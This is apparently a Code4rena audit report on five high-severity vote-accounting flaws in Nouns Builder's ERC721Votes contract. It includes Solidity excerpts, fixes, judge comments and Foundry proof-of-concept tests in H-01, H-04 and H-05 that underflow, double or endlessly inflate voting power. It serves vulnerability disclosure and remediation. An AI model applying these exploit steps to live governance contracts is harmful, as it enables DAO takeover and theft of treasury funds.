[H-01] User can get unlimited votes
Submitted by saian, also found by 0x4non, Ch_301, davidbrai, izhuer, MEP, Picodes, PwnPatrol, R2, rotcivegaf, scaraven, and Soosh
aftertokenTransferin ERC721Votes transfers votes between user addresses instead of the delegated addresses, so a user can cause overflow in_moveDelegatesand get unlimited votes.
Proof of Concept
https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/lib/token/ERC721Votes.sol#L268
function _afterTokenTransfer(address _from,address _to,uint256 _tokenId) internal override {// Transfer 1 vote from the sender to the recipient_moveDelegateVotes(_from, _to, 1);super._afterTokenTransfer(_from, _to, _tokenId);}
https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/lib/token/ERC721Votes.sol#L216
_moveDelegateVotes(prevDelegate, _to, balanceOf(_from));...unchecked {...// Update their voting weight_writeCheckpoint(_from, nCheckpoints, prevTotalVotes, prevTotalVotes - _amount);}
During delegationbalanceOf(from)amount of votes transferred are to the_toaddress
function test_UserCanGetUnlimitedVotes() public {vm.prank(founder);auction.unpause();vm.prank(bidder1);auction.createBid{ value: 1 ether }(2);vm.warp(10 minutes + 1 seconds);auction.settleCurrentAndCreateNewAuction();assertEq(token.ownerOf(2), bidder1);console.log(token.getVotes(bidder1)); // 1console.log(token.delegates(bidder1)); // 0 bidder1vm.prank(bidder1);token.delegate(bidder2);console.log(token.getVotes(bidder1)); // 1console.log(token.getVotes(bidder2)); // 1vm.prank(bidder1);auction.createBid{value: 1 ether}(3);vm.warp(22 minutes);auction.settleCurrentAndCreateNewAuction();assertEq(token.ownerOf(3), bidder1);console.log(token.balanceOf(bidder1)); // 2console.log(token.getVotes(bidder1)); // 2console.log(token.getVotes(bidder2)); // 1vm.prank(bidder1);token.delegate(bidder1);console.log(token.getVotes(bidder1)); // 4console.log(token.getVotes(bidder2)); // 6277101735386680763835789423207666416102355444464034512895}
When user1 delegates to another addressbalanceOf(user1)amount of tokens are subtraced from user2’s votes, this will cause underflow and not revert since the statements are unchecked
Tools Used
Foundry
Recommended Mitigation Steps
Change delegate transfer inafterTokenTransferto
_moveDelegateVotes(delegates(_from), delegates(_to), 1);
Alex the Entreprenerd (judge) increased severity to High and commented:
The warden has shown how to exploit:An unchecked section of the codeAn incorrect logic in moving tokenDelegationTo trigger an underflow that gives each user the maximum voting power.While some setup is necessary (having 1 token), I think the exploit is impactful enough to warrant High Severity, as any attacker will be able to obtain infinite voting power on multiple accounts.In contrast to other reports, this finding (as well as it’s duplicates) are using an unchecked operation to negatively overflow the amount of votes to gain the maximum value.
tbtstl (Nouns Builder) confirmed

[H-02] ERC721Votes’s delegation disables NFT transfers and burning
Submitted by hyh
If Alice the NFT owner first delegates her votes to herself, second delegates to anyone else with delegate() or delegateBySig() then all her NFT ids will become stuck: their transfers and burning will be disabled.
The issue is _afterTokenTransfer() callback running the _moveDelegateVotes() with an owner instead of her delegate. As Alice’s votes in the checkpoint is zero after she delegated them, the subtraction _moveDelegateVotes() tries to perform during the move of the votes will be reverted.
As ERC721Votes is parent to Token and delegate is a kind of common and frequent operation, the impact is governance token moves being frozen in a variety of use cases, which interferes with governance voting process and can be critical for the project.
Proof of Concept
Suppose Alice delegated all her votes to herself and then decided to delegate them to someone else with either delegate() or delegateBySig() calling _delegate():
https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/lib/token/ERC721Votes.sol#L179-L190
function_delegate(address_from,address_to)internal{// Get the previous delegateaddressprevDelegate=delegation[_from];// Store the new delegatedelegation[_from] =_to;emitDelegateChanged(_from,prevDelegate,_to);// Transfer voting weight from the previous delegate to the new delegate_moveDelegateVotes(prevDelegate,_to,balanceOf(_from));}
_moveDelegateVotes() will set her votes to0as_from == AliceandprevTotalVotes = _amount = balanceOf(Alice)(as _afterTokenTransfer() incremented Alice’s vote balance on each mint to her):
https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/lib/token/ERC721Votes.sol#L196-L217
function_moveDelegateVotes(address_from,address_to,uint256_amount)internal{unchecked{// If voting weight is being transferred:if(_from!=_to&&_amount>0) {// If this isn't a token mint:if(_from!=address(0)) {// Get the sender's number of checkpointsuint256nCheckpoints=numCheckpoints[_from]++;// Used to store the sender's previous voting weightuint256prevTotalVotes;// If this isn't the sender's first checkpoint: Get their previous voting weightif(nCheckpoints!=0)prevTotalVotes=checkpoints[_from][nCheckpoints-1].votes;// Update their voting weight_writeCheckpoint(_from,nCheckpoints,prevTotalVotes,prevTotalVotes-_amount);}
After that her votes in the checkpoint become zero. She will not be able to transfer the NFT as_afterTokenTransferwill revert on_moveDelegateVotes’s attempt to move1vote fromAliceto_to, whilecheckpoints[Alice][nCheckpoints - 1].votesis0:
https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/lib/token/ERC721Votes.sol#L262-L268
function_afterTokenTransfer(address_from,address_to,uint256_tokenId)internaloverride{// Transfer 1 vote from the sender to the recipient_moveDelegateVotes(_from,_to,1);
Recommended Mitigation Steps
The root issue is _afterTokenTransfer() dealing with Alice instead of Alice’s delegate.
Consider including delegates() call as a fix:
https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/lib/token/ERC721Votes.sol#L262-L268
function_afterTokenTransfer(address_from,address_to,uint256_tokenId)internaloverride{// Transfer 1 vote from the sender to the recipient-_moveDelegateVotes(_from,_to,1);+_moveDelegateVotes(delegates(_from),delegates(_to),1);
Asdelegates(address(0)) == address(0)the burning/minting flow will persist:
https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/lib/token/ERC721Votes.sol#L124-L129
/// @notice The delegate for an account/// @param _account The account addressfunctiondelegates(address_account)externalviewreturns(address) {addresscurrent=delegation[_account];returncurrent==address(0) ?_account:current;}
tbtstl (Nouns Builder) confirmed
Alex the Entreprenerd (judge) commented:
The Warden has shown how, due to the overlapping system handling delegation and balances, it is possible for a user to brick their owntransferabilityof their tokens.This POC shows that any delegation will cause the issues as when dealing with a transfer, their currently zero-vote-balance will further be deducted instead of the delegated votes they have.Because the finding shows a broken invariant, in that any delegation will brick transfers, as the invariants offered by ERC721Votes have been broken; I believe High Severity to be appropriate.

[H-03] Multiple vote checkpoints per block will lead to incorrect vote accounting
Submitted by berndartmueller, also found by 0x52, 0xSky, bin2chen, cccz, Chom, davidbrai, elprofesor, izhuer, m9800, PwnPatrol, and rvierdiiev
Voting power for each NFT owner is persisted within timestamp-dependent checkpoints. Every voting power increase or decrease is recorded. However, the implementation ofERC721Votescreates separate checkpoints with the same timestamp for each interaction, even when the interactions happen in the same block/timestamp.
Impact
Checkpoints with the sametimestampwill cause issues within theERC721Votes.getPastVotes(..)function and will return incorrect votes for a given_timestamp.
Proof of Concept
lib/token/ERC721Votes.sol#L252-L253
/// @dev Records a checkpoint/// @param _account The account address/// @param _id The checkpoint id/// @param _prevTotalVotes The account's previous voting weight/// @param _newTotalVotes The account's new voting weightfunction_writeCheckpoint(address_account,uint256_id,uint256_prevTotalVotes,uint256_newTotalVotes)private{// Get the pointer to store the checkpointCheckpointstoragecheckpoint=checkpoints[_account][_id];// Record the updated voting weight and current timecheckpoint.votes=uint192(_newTotalVotes);checkpoint.timestamp=uint64(block.timestamp);emitDelegateVotesChanged(_account,_prevTotalVotes,_newTotalVotes);}
Consider the following example and the votes checkpoint snapshots:
Note: Bob owns a smart contract used to interact with the protocol
Transaction 0:Bob’s smart contract receives 1 NFT through minting (1 NFT equals 1 vote)
Checkpoint IndexTimestampVotes001
Transaction 1:Bob’s smart contract receives one more NFT through minting
Checkpoint IndexTimestampVotes001112
Transaction 1:Within the same transaction 1, Bob’s smart-contract delegates 2 votes to Alice
Checkpoint IndexTimestampVotes001112210
Transaction 1:Again within the same transaction 1, Bob’s smart contract decides to reverse the delegation and self-delegates
Checkpoint IndexTimestampVotes001112210312
Transaction 1:Bob’s smart contract buys one more NFT
Checkpoint IndexTimestampVotes001112210312423
Bob now wants to vote (via his smart contract) on a governance proposal that has been created ontimeCreated = 1(timestamp 1).
Internally, theGovernor._castVotefunction determines the voter’s weight by callinggetVotes(_voter, proposal.timeCreated).
governance/governor/Governor.sol#L275
weight=getVotes(_voter,proposal.timeCreated);
getVotescallsERC721.getPastVotesinternally:
governance/governor/Governor.sol#L462
functiongetVotes(address_account,uint256_timestamp)publicviewreturns(uint256) {returnsettings.token.getPastVotes(_account,_timestamp);}
ERC721.getPastVotes(..., 1)tries to find the checkpoint within thewhileloop:
# Iterationlowmiddlehigh0024
Themiddlecheckpoint with index2matches the given timestamp1and returns0votes. This is incorrect, as Bob has 2 votes. Bob is not able to vote properly.
(Please be aware that this is just one of many examples of how this issue can lead to incorrect vote accounting. In other cases, NFT owners could have more voting power than they are entitled to)
Recommended mitigation steps
Consider batching multiple checkpoints writes per block/timestamp similar to how NounsDAO records checkpoints.
Alex the Entreprenerd (judge) commented:
The Warden has shown how the checkpoint math can be gamed, opening up governance to flashloan exploits, infinite voting power and overall breaking all of governance quorum and execution thresholds.Because any attacker can spam create checkpoints, to manipulate the result of the Binary Search, they can manipulate their balance to make the Governor think it’s way higher than intended.Mitigation requires ensuring that the only balance recorded for a block is the latest value (end of flashloan so the balance goes back down).Because the finding breaks accounting, allowing governance takeover, and the invariants of ERC721Votes are broken (votes are not what they are), I agree with High Severity.
kulkarohan (Nouns Builder) confirmed

[H-04]ERC721Votes: Token owners can double voting power through self delegation
Submitted by zkhorse, also found by berndartmueller, Ch_301, hxzy, hyh, MEP, pcarranzav, pfapostol, Picodes, and Solimander
The owner of one or manyERC721Votestokens can double their voting power once (and only once) by delegating to their own address as their first delegation.
Scenario
This exploit relies on the initial default value of thedelegationmapping inERC721Votes, which is why it will only work once per address.
First, the token owner must calldelegateordelegateBySig, passing their own address as the delegate:
ERC721Votes#delegate
/// @notice Delegates votes to an account/// @param _to The address delegating votes tofunctiondelegate(address_to)external{_delegate(msg.sender,_to);}
This calls into the internal_delegatefunction, with_fromand_toboth set to the token owner’s address:
ERC721Votes#_delegate
/// @dev Updates delegate addresses/// @param _from The address delegating votes from/// @param _to The address delegating votes tofunction_delegate(address_from,address_to)internal{// Get the previous delegateaddressprevDelegate=delegation[_from];// Store the new delegatedelegation[_from] =_to;emitDelegateChanged(_from,prevDelegate,_to);// Transfer voting weight from the previous delegate to the new delegate_moveDelegateVotes(prevDelegate,_to,balanceOf(_from));}
Since this is the token owner’s first delegation, thedelegationmapping does not contain a value for the_fromaddress, andprevDelegateon L#181 will be set toaddress(0):
ERC721Votes.sol#L180-L181
// Get the previous delegateaddressprevDelegate=delegation[_from];
This function then calls into_moveDelegateVotesto transfer voting power. This time,_fromisprevDelegate, equal toaddress(0);_tois the token owner’s address; and_amountisbalanceOf(_from), the token owner’s current balance:
ERC721Votes#_moveDelegateVotes
/// @dev Transfers voting weight/// @param _from The address delegating votes from/// @param _to The address delegating votes to/// @param _amount The number of votes delegatingfunction_moveDelegateVotes(address_from,address_to,uint256_amount)internal{unchecked{// If voting weight is being transferred:if(_from!=_to&&_amount>0) {// If this isn't a token mint:if(_from!=address(0)) {// Get the sender's number of checkpointsuint256nCheckpoints=numCheckpoints[_from]++;// Used to store the sender's previous voting weightuint256prevTotalVotes;// If this isn't the sender's first checkpoint: Get their previous voting weightif(nCheckpoints!=0)prevTotalVotes=checkpoints[_from][nCheckpoints-1].votes;// Update their voting weight_writeCheckpoint(_from,nCheckpoints,prevTotalVotes,prevTotalVotes-_amount);}// If this isn't a token burn:if(_to!=address(0)) {// Get the recipients's number of checkpointsuint256nCheckpoints=numCheckpoints[_to]++;// Used to store the recipient's previous voting weightuint256prevTotalVotes;// If this isn't the recipient's first checkpoint: Get their previous voting weightif(nCheckpoints!=0)prevTotalVotes=checkpoints[_to][nCheckpoints-1].votes;// Update their voting weight_writeCheckpoint(_to,nCheckpoints,prevTotalVotes,prevTotalVotes+_amount);}}}}
Theifcondition on L#203 istrue, since_fromisaddress(0),_tois the owner address, and_amountis nonzero:
ERC721Votes.sol#L202-L203
// If voting weight is being transferred:if(_from!=_to&&_amount>0) {
Execution skips theifblock on L#205-217, since_fromisaddress(0):
ERC721Votes.sol#L205-L217
// If this isn't a token mint:if(_from!=address(0)) {// Get the sender's number of checkpointsuint256nCheckpoints=numCheckpoints[_from]++;// Used to store the sender's previous voting weightuint256prevTotalVotes;// If this isn't the sender's first checkpoint: Get their previous voting weightif(nCheckpoints!=0)prevTotalVotes=checkpoints[_from][nCheckpoints-1].votes;// Update their voting weight_writeCheckpoint(_from,nCheckpoints,prevTotalVotes,prevTotalVotes-_amount);}
However, theifblock on L#220-232 will execute and increase the voting power allocated to_to:
ERC721Votes.sol#L220-L232
// If this isn't a token burn:if(_to!=address(0)) {// Get the recipients's number of checkpointsuint256nCheckpoints=numCheckpoints[_to]++;// Used to store the recipient's previous voting weightuint256prevTotalVotes;// If this isn't the recipient's first checkpoint: Get their previous voting weightif(nCheckpoints!=0)prevTotalVotes=checkpoints[_to][nCheckpoints-1].votes;// Update their voting weight_writeCheckpoint(_to,nCheckpoints,prevTotalVotes,prevTotalVotes+_amount);}
The token owner’s voting power has now been increased by an amount equal to their total number of tokens, without an offsetting decrease.
This exploit only works once: if a token owner subsequently delegates to themselves after their initial self delegation,prevDelegatewill be set to a non-default value in_delegate, and the delegation logic will work as intended.
Impact
MaliciousERC21Votesowners can accrue more voting power than they deserve. Especially malicious owners may quietly acquire multiple tokens before doubling their voting power. In an early DAO with a small supply of tokens, the impact of this exploit could be significant.
Recommended Mitigation Steps
Make thedelegatesfunctionpublicrather thanexternal:
/// @notice The delegate for an account/// @param _account The account addressfunctiondelegates(address_account)publicviewreturns(address) {addresscurrent=delegation[_account];returncurrent==address(0) ?_account:current;}
Then, call this function rather than accessing thedelegationmapping directly:
/// @dev Updates delegate addresses/// @param _from The address delegating votes from/// @param _to The address delegating votes tofunction_delegate(address_from,address_to)internal{// Get the previous delegateaddressprevDelegate=delegates(_from);// Store the new delegatedelegation[_from] =_to;emitDelegateChanged(_from,prevDelegate,_to);// Transfer voting weight from the previous delegate to the new delegate_moveDelegateVotes(prevDelegate,_to,balanceOf(_from));}
Note that the original NounsDAO contracts follow this pattern. (Seehereandhere).
Test cases
(Put the following test cases inGov.t.sol)
functiontest_delegate_to_self_doubles_voting_power()public{mintVoter1();assertEq(token.getVotes(address(voter1)),1);vm.startPrank(voter1);token.delegate(address(voter1));assertEq(token.getVotes(address(voter1)),2);}functionmintToken(uint256tokenId)internal{vm.prank(voter1);auction.createBid{ value:0.420ether}(tokenId);vm.warp(block.timestamp+auctionParams.duration+1seconds);auction.settleCurrentAndCreateNewAuction();}functiontest_delegate_to_self_multiple_tokens_doubles_voting_power()public{// An especially malicious user may acquire multiple tokens// before doubling their voting power through this exploit.mintVoter1();mintToken(3);mintToken(4);mintToken(5);mintToken(6);assertEq(token.getVotes(address(voter1)),5);vm.prank(voter1);token.delegate(address(voter1));assertEq(token.getVotes(address(voter1)),10);}
Alex the Entreprenerd (judge) commented:
The warden has shown how, because of an incorrect assumption in reducing a non-existing previous delegate votes, through self-delegation, a user can double their voting power.Because the finding shows how the delegation system is broken, and because governance is a core aspect (Secure funds, move funds, etc..) I agree with High Severity.Due to multiple reports of this type, with various different attacks, mitigation is non-trivial.
kulkarohan (Nouns Builder) confirmed
Alex the Entreprenerd (judge) commented:
In contrast to the dangerous overflow, this finding (and its duplicates) has shown how the Delegation Mechanism can be used to double the voting power.For that reason, the underlying issue being different, am choosing to leave this finding separate.

[H-05]_transferFrom()can be used to indefinitely increase voting power
Submitted by Soosh, also found by Ch_301, davidbrai, and PwnPatrol
It is possible to indefinitely increase voting power by creating new accounts (addresses) and delegating. This will lead to unfair governance as a user can vote with more votes than actual.
Explanation
The_transferFrom()does not move delegates from the src’s delegates to the destination’s delegates, instead, it moves directly from src to dest. (see recommendations and Code POC for better understanding)
Code POC
// Insert this test case into Token.t.sol// Run: forge test --match-contract Token -vvimport"forge-std/console.sol";...functiontestIncreaseVotePower()public{deployMock();addressvoter1;addressvoter2;uint256voter1PK;uint256voter2PK;// Voter with 1 NFT voting powervoter1PK=0xABC;voter1=vm.addr(voter1PK);vm.deal(voter1,1ether);// Second account created by same votervoter2PK=0xABD;voter2=vm.addr(voter2PK);// Giving voter1 their 1 NFTvm.prank(founder);auction.unpause();vm.prank(voter1);auction.createBid{ value:0.420ether}(2);vm.warp(auctionParams.duration+1seconds);auction.settleCurrentAndCreateNewAuction();// Start Exploitconsole.log("Initial Votes");console.log("voter1: ",token.getVotes(voter1));console.log("voter2: ",token.getVotes(voter2));vm.prank(voter1);token.delegate(voter2);console.log("After Delegating Votes, voter1 -> delegate(voter2)");console.log("voter1: ",token.getVotes(voter1));console.log("voter2: ",token.getVotes(voter2));vm.prank(voter1);token.transferFrom(voter1,voter2,2);console.log("After Token transfer, voter1 -transferFrom()-> voter2");console.log("voter1 votes: ",token.getVotes(voter1));console.log("voter2 votes: ",token.getVotes(voter2));vm.prank(voter2);token.delegate(voter2);console.log("After Delegating Votes, voter2 -> delegate(voter2)");console.log("voter1: ",token.getVotes(voter1));console.log("voter2: ",token.getVotes(voter2));}
Expected Output:
[PASS]testVoteDoublePower() (gas:3544946)Logs:Initial Votesvoter1:  1voter2:  0After Delegating Votes, voter1 -> delegate(voter2)voter1:  1voter2:  1After Token transfer, voter1 -transferFrom()-> voter2voter1 votes:  0voter2 votes:  2After Delegating Votes, voter2 -> delegate(voter2)voter1:  0voter2:  3
Recommended Mitigation Steps
Looking atOpenZeppelin’s ERC721Voteswhich I believe the team took reference from, it states:
* Tokens do not count as votes until they are delegated, because votes must be tracked which incurs an additional cost* on every transfer. Token holders can either delegate to a trusted representative who will decide how to make use of* the votes in governance decisions, or they can delegate to themselves to be their own representative.
The current implementation does not follow this, and tokens count as votes without being delegated. To fix this issue, votes should only be counted when delegated.
I believe the issue is here on thisline
// Transfer 1 vote from the sender to the recipient_moveDelegateVotes(_from,_to,1);
Where it should move from the delegate of_fromto the delegate of_to. Suggested FIx:
_moveDelegateVotes(delegation[_from],delegation[_to],1);
iainnash (Nouns Builder) confirmed and commented:
Would agree w/ High risk.
Alex the Entreprenerd (judge) commented:
The Warden has shown how, due to an incorrect handling of delegation, a Token Holder can delegate their voting power without losing it, allowing for an exploit that allows them to reach infinite voting power.I believe that some of the problems with Delegation shown via this contest can be traced down to this quote from theOZ DocumentationTokens do not count as votes until they are delegated, because votes must be tracked which incurs an additional cost on every transfer. Token holders can either delegate to a trusted representative who will decide how to make use of the votes in governance decisions, or they can delegate to themselves to be their own representative.Remediation of this specific issue can be done by following the warden advice, and using the Test Case to verify the exploit has been patched, additionally, further thinking into how delegation should behave will be necessary to ensure the system is patched to safety
Alex the Entreprenerd (judge) commented:
In contrast toissue 469(Unsafe Underflow) andissue 413(Self Delegation for doubling of votes), this report is showing how, due to an incorrect accounting, a user can repeatedly transfer and delegate to achieve infinite voting power.While the outcome of all 3 is increased voting power, I believe the uniqueness of the attack is in exploiting a different aspect of the code.Remediation should account for all 3 exploits, and I believe, because of the uniqueness of the attack, that this is a distinct report vs the previously mentioned.

